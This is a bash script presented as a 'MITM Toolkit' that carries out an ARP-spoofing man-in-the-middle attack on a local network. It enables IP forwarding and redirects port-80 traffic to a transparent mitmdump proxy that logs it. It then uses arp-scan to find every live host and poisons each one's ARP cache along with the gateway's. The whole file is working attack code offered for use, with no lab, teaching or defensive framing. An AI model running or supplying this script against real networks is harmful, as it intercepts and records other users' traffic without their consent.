#!/bin/bash

# ======================[ CONFIG ]=======================
IFACE=${1:-$(ip route | grep default | awk '{print $5}')}  # Auto-detect interface
PROXY_PORT=8080                                            # mitmproxy HTTP port
MITMPROXY_LOG="mitmproxy.log"
ENABLE_PROXY=true                                          # Set false to skip mitmproxy
# ========================================================

trap cleanup INT

function banner() {
cat << "EOF"

          _____                    _____                _____                    _____                  
         /\    \                  /\    \              /\    \                  /\    \                 
        /::\____\                /::\    \            /::\    \                /::\____\                
       /::::|   |                \:::\    \           \:::\    \              /::::|   |                
      /:::::|   |                 \:::\    \           \:::\    \            /:::::|   |                
     /::::::|   |                  \:::\    \           \:::\    \          /::::::|   |                
    /:::/|::|   |                   \:::\    \           \:::\    \        /:::/|::|   |                
   /:::/ |::|   |                   /::::\    \          /::::\    \      /:::/ |::|   |                
  /:::/  |::|___|______    ____    /::::::\    \        /::::::\    \    /:::/  |::|___|______          
 /:::/   |::::::::\    \  /\   \  /:::/\:::\    \      /:::/\:::\    \  /:::/   |::::::::\    \         
/:::/    |:::::::::\____\/::\   \/:::/  \:::\____\    /:::/  \:::\____\/:::/    |:::::::::\____\        
\::/    / ~~~~~/:::/    /\:::\  /:::/    \::/    /   /:::/    \::/    /\::/    / ~~~~~/:::/    /        
 \/____/      /:::/    /  \:::/:::/    / \/____/   /:::/    / \/____/  \/____/      /:::/    /         
             /:::/    /    \::::::/    /           /:::/    /                       /:::/    /          
            /:::/    /      \::::/____/           /:::/    /                       /:::/    /           
           /:::/    /        \::: \    \           \::/    /                       /:::/    /            
          /:::/    /          \::: \    \           \/____/                       /:::/    /             
         /:::/    /            \::: \    \                                       /:::/    /              
        /:::/    /              \::: \____\                                     /:::/    /               
        \::/    /                \::/    /                                     \::/    /                
         \/____/                  \/____/                                       \/____/                 
                                                                                                        
                                                                                     MITM Toolkit v1.0

          ⚡ Created by Tonilkumar (Inovwave Technologies)
EOF
}

function cleanup() {
    echo -e "\n[!] Cleaning up..."
    killall arpspoof mitmproxy 2>/dev/null
    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port $PROXY_PORT 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo "[+] Done. Exiting."
    exit
}

function check_dependencies() {
    for cmd in arpspoof arp-scan mitmproxy; do
        if ! command -v $cmd &>/dev/null; then
            echo "[!] Required command '$cmd' is not installed."
            exit 1
        fi
    done
}

function launch_arpspoof() {
    local TARGET=$1
    local GATEWAY=$2

    if command -v gnome-terminal >/dev/null 2>&1; then
        gnome-terminal -- bash -c "arpspoof -i $IFACE -t $TARGET $GATEWAY; exec bash" &
        gnome-terminal -- bash -c "arpspoof -i $IFACE -t $GATEWAY $TARGET; exec bash" &
    elif command -v konsole >/dev/null 2>&1; then
        konsole --noclose -e bash -c "arpspoof -i $IFACE -t $TARGET $GATEWAY" &
        konsole --noclose -e bash -c "arpspoof -i $IFACE -t $GATEWAY $TARGET" &
    else
        echo "[*] No GUI terminal detected, running arpspoof in background..."
        arpspoof -i "$IFACE" -t "$TARGET" "$GATEWAY" > /dev/null 2>&1 &
        arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET" > /dev/null 2>&1 &
    fi
}

# ============ Script Start ============

clear
banner

# Check root
if [[ $EUID -ne 0 ]]; then
    echo "[!] Please run this script as root."
    exit 1
fi

check_dependencies

# Validate interface
if ! ip link show "$IFACE" &>/dev/null; then
    echo "[!] Invalid network interface: $IFACE"
    exit 1
fi

# Get IP info
MY_IP=$(ip -4 addr show "$IFACE" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
GATEWAY_IP=$(ip route | grep default | awk '{print $3}')

echo "[*] Interface  : $IFACE"
echo "[*] Your IP    : $MY_IP"
echo "[*] Gateway IP : $GATEWAY_IP"

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect HTTP traffic to proxy
iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port $PROXY_PORT

# Start mitmproxy if enabled
if [ "$ENABLE_PROXY" = true ]; then
    echo "[*] Starting mitmdump (headless) on port $PROXY_PORT..."
    nohup mitmdump --mode transparent --showhost -p "$PROXY_PORT" > "$MITMPROXY_LOG" 2>&1 &
    echo "[+] mitmdump logging to $MITMPROXY_LOG"
fi

# Scan network for live hosts
echo "[*] Scanning for live hosts..."
TARGETS=$(arp-scan --interface="$IFACE" --localnet | grep -oP '(\d{1,3}\.){3}\d{1,3}' | grep -vE "$MY_IP|$GATEWAY_IP" | sort -u)

if [[ -z "$TARGETS" ]]; then
    echo "[!] No targets found. Exiting."
    cleanup
fi

echo "[*] Found targets:"
echo "$TARGETS"

# Start ARP spoofing on each target
for TARGET_IP in $TARGETS; do
    echo "[*] Spoofing $TARGET_IP <--> $GATEWAY_IP"
    launch_arpspoof "$TARGET_IP" "$GATEWAY_IP"
done

echo -e "\n[+] ARP spoofing in progress... Press Ctrl+C to stop and cleanup."
wait
